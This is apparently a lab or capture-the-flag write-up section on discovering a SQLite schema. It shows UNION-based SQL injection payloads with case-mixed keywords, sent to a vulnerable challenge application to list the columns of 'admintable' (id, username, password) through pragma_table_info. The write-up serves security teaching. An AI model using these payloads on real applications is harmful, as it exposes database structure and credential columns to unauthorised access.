# 5. Database Schema Discovery

## Objective

Discover database objects and identify the columns in the `admintable` table.

## What is a database schema?

A database schema describes how a database is organised. It includes information about tables, columns, data types, indexes, views, triggers, and constraints.

Think of it as a blueprint of the database.

## SQLite metadata: `sqlite_master`

SQLite maintains a system table called `sqlite_master`. It stores metadata about database objects, including:

- Tables
- Indexes
- Views
- Triggers

Example:

```sql
SELECT name, type FROM sqlite_master;
```

This query retrieves database object names and their types.

## Discovered table

During the investigation, the following table was identified:

```text
admintable
```

## Inspecting table columns

SQLite provides `PRAGMA table_info` to return metadata about a table's columns.

```sql
PRAGMA table_info('admintable');
```

SQLite also supports the table-valued function:

```sql
SELECT * FROM pragma_table_info('admintable');
```

The `name` field contains a column name, while `cid` indicates its position in the table. SQLite column indexes start at zero.

## Column enumeration through SQLite metadata

The following inputs were used through the vulnerable challenge application. The application context supplied the surrounding SQL and closing quote.

### Test 1: Identify the column at index 1

```sql
smokey' UniOn SeLeCt name FROM pragma_table_info('admintable') WHERE cid=1 AND '1'='1
```

**Observation:**

```text
username
```

The column at index 1 was identified as `username`.

### Test 2: Identify the column at index 2

```sql
smokey' UniOn SeLeCt name FROM pragma_table_info('admintable') WHERE cid=2 AND '1'='1
```

**Observation:**

```text
password
```

The column at index 2 was identified as `password`.

### Test 3: Retrieve the available column names

```sql
smokey' UniOn SeLeCt name FROM pragma_table_info('admintable') WHERE 1=1 AND '1'='1
```

**Observation:** The metadata output included:

```text
id
```

The always-true condition `1=1` allows the metadata query to return the column names rather than restricting it to one particular `cid`.

## Final discovered schema

| cid | Column name | Observation |
|---:|---|---|
| 0 | `id` | Identified |
| 1 | `username` | Identified |
| 2 | `password` | Identified |

The investigation identified these three columns. The complete metadata output should be checked before concluding that no additional columns exist.

## Why schema discovery matters

Schema discovery helps an investigator understand how information is organised and which columns may contain sensitive data.

If an application exposes database metadata through SQL injection, an attacker may learn internal database structure and use that knowledge to target further queries.

## Key takeaway

`sqlite_master` provides metadata about database objects. `pragma_table_info()` provides information about the columns of a particular table. Together, they help investigate SQLite database structure.
